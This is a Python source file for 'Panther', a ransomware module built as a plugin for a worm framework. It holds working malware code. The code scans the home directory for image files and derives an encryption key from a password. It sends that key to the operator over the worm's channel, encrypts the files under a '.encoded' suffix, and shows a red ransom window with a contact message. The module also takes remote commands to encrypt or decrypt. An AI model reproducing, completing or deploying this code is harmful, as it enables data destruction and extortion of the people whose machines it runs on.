#!name##Panther
#!types##module
#!info##Ransomware module. Generates a key based on a password and salt. Transmits the key to the server. Encrypts all files and given extensions.
#!reqVar##PAN_file_ext##Types of files to be encrypted##list
#!setVar##PAN_file_ext##[".gif", "jpeg", "jpg", "bmp"]##list
#!reqVar##PAN_password##A string of characters (password) that will be used to generate the encryption key.##str
#!setVar##PAN_password##SuperStrongPassword##str
#!reqVar##PAN_message##The message that will be displayed in the window when all files are encrypted.##str
#!setVar##PAN_message##If you want to recover your files contact: example@gmail.com##str




import secrets
import os
import base64
import tkinter

from threading import Thread
from typing import Union
from time import sleep

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


class Panther:
    MTYPES = "rans"
    def __init__(self, worm: object):
        self.worm = worm
        self.os = "linux"
        self.targets = set()
        self.owned = set()
        self.base_dir = os.path.expanduser("~")
        self.file_ext = {{PAN_file_ext}}
        self.file_ext_encode = ".encoded"
        self.correct_extension()
        self._key = None
        self.salt_size = 16
        self.password = "{{PAN_password}}"
        


    def correct_extension(self) -> None:
        fext = []
        for ext in self.file_ext:
            fext.append(f".{ext.lstrip('.')}")
        self.file_ext = fext

    def get_base_dirs(self) -> list:
        bdirs = []
        for item in os.listdir(self.base_dir):
            item_path = os.path.join(self.base_dir, item)
            if os.path.isdir(item_path):
                bdirs.append(item_path)
            else:
                fext = os.path.splitext(item_path)
                if fext[1] in self.file_ext:
                    self.targets.add(item_path)
                if fext[1] == self.file_ext_encode:
                    self.owned.add(item_path)
        return bdirs
    
    def _find_victims(self, base_dir: str) -> None:
        for root, dirs, files in os.walk(base_dir):
            for f in files:
                fext = os.path.splitext(os.path.join(root, f))
                if fext[1] in self.file_ext:
                    self.targets.add(os.path.join(root, f))
    
    def find_victims(self) -> None:
        bdirs = self.get_base_dirs()
        thr = []
        for bdir in bdirs:
            find = Thread(target=self._find_victims, args=(bdir,), daemon=True)
            find.start()
            thr.append(find)
        for th in thr:
            th.join()
    
    def _find_owned(self, base_dir: str) -> None:
        for root, dirs, files in os.walk(base_dir):
            for f in files:
                fext = os.path.splitext(os.path.join(root, f))
                if fext[1] == self.file_ext_encode:
                    self.owned.add(os.path.join(root, f))

    def find_owned(self) -> None:
        bdirs = self.get_base_dirs()
        thr = []
        for bdir in bdirs:
            find = Thread(target=self._find_owned, args=(bdir,), daemon=True)
            find.start()
            thr.append(find)
        for th in thr:
            th.join()

        
    def generate_key(self) -> None:
        if self._key:
            return
        salt = secrets.token_bytes(self.salt_size)
        kdf = Scrypt(salt, length=32, n=2**14, r=8, p=1)
        kdf = kdf.derive(self.password.encode())
        self._key = base64.urlsafe_b64encode(kdf)
    
    def encrypt_file(self, path: str) -> None:
        f = Fernet(self._key)
        try:
            with open(path, "rb") as file:
                data = file.read()
        except:
            return
        ecdata = f.encrypt(data)
        npath = path + self.file_ext_encode
        os.rename(path, npath)
        try:
            with open(npath, "wb") as file:
                file.write(ecdata)
        except:
            return
    
    def decrypt_file(self, path: str) -> None:
        f = Fernet(self._key)
        try:
            with open(path, "rb") as file:
                ecdata = file.read()
        except:
            return
        data = f.decrypt(ecdata)
        npath = path.rstrip(self.file_ext_encode)
        try:
            with open(npath, "wb") as file:
                file.write(data)
        except:
            return
        try:
            os.remove(path)
        except:
            return
    
    def encrypt(self) -> None:
        self.generate_key()
        self.send_key()
        self.find_victims()
        for file in self.targets:
            self.encrypt_file(file)
        self.warn_window()
    
    def decrypt(self) -> None:
        self.find_owned()
        for file in self.owned:
            self.decrypt_file(file)

    def send_key(self) -> None:
        if not self._key:
            return
        self.worm.send_data({"types" : "ransk", "data" : self._key.decode()})
        self.worm.send_msg(f"Ransomware KEY: {self._key.decode()}")
    
    def add_key(self, key: str) -> None:
        self._key = key.encode()
    
    def warn_window(self) -> None:
        window = tkinter.Tk()
        window.geometry("800x500")
        window.title(self.worm.name)
        window.configure(bg="red")
        mlabel = tkinter.Label(window, text="!!! Your files have been encrypted !!!", font=("Arial", 26), fg="black", bg="red")
        mlabel.pack(pady=25)
        tlabel = tkinter.Label(window, text="{{PAN_message}}", font=("Arial", 16))
        tlabel.pack(pady=30)
        window.mainloop()
    

    
    def help(self) -> str:
        h = "\n---- Panther Help: ------\n"
        h += f"{'Panther_encrypt':<25} Encrypt Files\n"
        h += f"{'Panther_decrypt':<25} Decrypt Files\n"
        h += f"{'Panther_Key <key>':<25} Send key to worm\n"
        return h

    def exec_cmd(self, cmd: dict) -> None:
        com = cmd.get("cmd")
        if not com:
            return
        match com:
            case "Panther_encrypt":
                self.encrypt()
            case "Panther_decrypt":
                self.decrypt()
            case "Panther_Key":
                key = cmd.get("data")
                self.add_key(key)
    
    def begin(self) -> None:
        cry = Thread(target=self.encrypt)
        cry.start()
    
    def start(self) -> None:
        sleep(5)
        self.begin()


    
    